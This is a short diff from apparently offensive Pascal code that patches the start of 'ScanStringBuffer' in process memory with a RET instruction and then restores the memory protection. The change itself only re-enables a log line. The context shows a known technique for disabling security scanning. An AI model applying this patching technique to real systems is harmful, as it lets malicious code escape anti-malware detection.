@@ -58,7 +58,7 @@ begin
     Move(RET, asb^, 1);
 
     //WriteProcessMemory(PidHandle, asb, @garbage, SizeOf(garbage), Written);
-    //WriteLn('[+] Written RET To the start of ScanStringBuffer');
+    WriteLn('[+] Written RET To the start of ScanStringBuffer');
 
   //Change memory protection to RX
     VirtualProtect(asb, 1, OldProtect, OldProtect);
